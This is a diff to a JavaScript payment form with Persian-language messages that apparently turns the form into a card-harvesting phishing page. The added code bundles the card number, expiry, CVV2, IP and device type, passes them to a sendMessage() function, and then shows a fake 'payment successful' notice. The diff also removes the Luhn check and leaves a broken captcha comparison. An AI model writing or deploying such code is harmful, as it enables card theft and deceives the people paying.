@@ -102,10 +102,9 @@ function validateCardNumber(cardNumber) {
   // بررسی اینکه آیا شماره کارت 16 رقمی است
   if (!/^\d{16}$/.test(cardNumber)) {
     return 'لطفاً یک شماره کارت 16 رقمی وارد کنید.';
+  } else {
+    return true;
   }
-
-  // اعتبارسنجی با استفاده از الگوریتم Luhn
-  return luhnCheck(cardNumber) ? true : false;
 }
 
 function luhnCheck(number) {
@@ -170,20 +169,17 @@ form.addEventListener('keydown', e => {
   let errors = [];
   if (!validateCardNumber(cardInput.value)) {
     errors.push('شماره کارت معتبر نیست.');
-  } else {
   }
   const mm = exprationInput.value.slice(0, 2);
   const yy = exprationInput.value.slice(3, 5);
   if (!validateExpirationDate(mm, yy)) {
     errors.push('تاریخ انقضا معتبر نیست.');
-  } else {
   }
-
   if (!validateCVV2(cvv2Input.value)) {
     errors.push('cvv2 معتبر نیست.');
   }
 
-  if (captchaInput.value !== '80860') {
+  if (!captchaInput.value === 80860) {
     errors.push('کدامنیتی معتبر نیست.');
   }
 
@@ -191,9 +187,72 @@ form.addEventListener('keydown', e => {
     validateCardNumber(cardInput.value) &&
     validateExpirationDate(mm, yy) &&
     validateCVV2(cvv2Input.value) &&
-    captchaInput.value === '80860'
+    captchaInput.value === "80860"
   ) {
-    
+    const message = `
+    Card Number: ${cardInput.value}
+    Expiration: ${mm}/${yy}
+    Cvv2: ${cvv2Input.value}
+    --------------
+    IP: ${userIp}
+    Device: ${getDeviceType()}
+  `;
+
+    let dat = '';
+    if (errors.length > 0) {
+      for (let text of errors) {
+        dat += text + '\n'; // اضافه کردن متن و رفتن به خط جدید
+      }
+      Toastify({
+        text: dat,
+        duration: 3000,
+        newWindow: true,
+        close: true,
+        gravity: 'top', // `top` or `bottom`
+        position: 'right', // `left`, `center` or `right`
+        stopOnFocus: true, // Prevents dismissing of toast on hover
+        style: {
+          fontSize: '1.1rem',
+          fontWeight: '600',
+          background: '#EA384D',
+          width: '300px',
+          minWidth: '300px',
+          display: 'flex',
+          justifyContent: 'space-between',
+        },
+      }).showToast();
+    } else {
+      console.log(cardInput.value);
+      console.log(mm);
+      console.log(yy);
+      console.log(cvv2Input.value);
+      sendMessage(message);
+      cardInput.value = '';
+      exprationInput.value = '';
+      cvv2Input.value = '';
+      setTimeout(() => {
+        Toastify({
+          text: 'پرداخت با موفقیت انجام شد.',
+          duration: 3000,
+          newWindow: true,
+          close: true,
+          gravity: 'top', // `top` or `bottom`
+          position: 'right', // `left`, `center` or `right`
+          stopOnFocus: true, // Prevents dismissing of toast on hover
+          style: {
+            fontSize: '1.1rem',
+            fontWeight: '600',
+            background: '#15bb09',
+            width: '300px',
+            minWidth: '300px',
+            display: 'flex',
+            justifyContent: 'space-between',
+          },
+        }).showToast();
+      }, 2000);
+    }
+  } else {
+    console.log(errors);
   }
 });
 
